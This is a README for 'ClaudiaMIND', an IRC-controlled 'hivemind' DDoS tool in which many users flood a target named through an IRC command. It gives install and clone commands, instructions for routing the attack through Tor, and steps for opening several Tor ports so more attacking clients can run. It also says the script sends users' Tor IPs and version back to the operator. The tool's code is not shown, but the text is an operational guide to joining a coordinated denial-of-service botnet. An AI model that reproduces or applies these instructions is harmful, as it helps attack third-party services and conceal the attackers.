# ClaudiaMIND
IRC hivemind DDoS tool
Basically a tool using which many people can attack a target specified using an IRC command.

Requires socks.
```sudo apt-get install python-socksipy```
or
```sudo pip install PySocks```

For Windows, download [socks.py](https://raw.githubusercontent.com/Anorov/PySocks/master/socks.py) from the [PySocks repository](https://github.com/Anorov/PySocks), or use Windows pip.

# Getting the program & updating
* Getting the program: ```git clone https://github.com/ClaudiaDAnon/ClaudiaMIND.git```
* Updating the program: Make sure you're in the ClaudiaMIND directory, then ```git pull```

# Usage

```$ python claudiamind.py```

Port: 9050 for the ```service tor``` and 9150 for the Tor browser (and therefore works on Windows)

Simply: If you're running Windows, start the Tor browser and type 9150 into the port column. If you're running linux, download tor if not installed (```sudo apt-get install tor```), make sure the service is running (```sudo service tor start```) and either enter 9050 or nothing (9050 is default).
**Alternatively, you can use the Tor browser port (9150) on Linux too.**
*Protip: On Linux, you can run both the Tor browser and the service.*

# Reporting policy
The script compares your IP to the Tor IP to make sure you're using Tor, and then sends me or any OP who requested it your **TOR IP**, only for statistical purposes and easier bugfixing. **Again, don't worry, that is not your real IP address.**.

It also sends me the version of your script, so I can tell some people to update it, etc.

# Tor routing
The *claudiashammer* module will say "Tor: False" - the module is indeed run without Tor, **but** this is because *claudiamind.py* already routes all of its traffic through Tor, including its modules' traffic. So even though *claudiashammer* says "Tor: False", it all goes through Tor.

# Using the program on multiple ports
Assuming you're in the ClaudiaMIND directory, just do this:
```
$ chmod +x claudia*
$ cd tor
$ chmod +x generate.py
$ ./generate.py
```
Now enter the amount of Tor ports you want
```
$ chmod +x torstart.sh
$ ./torstart.sh
```
Now, leave this window open and in another one, run claudiamind with one of the printed ports. (Obviously all of the ports. Ideally like 4 clients on the same port)
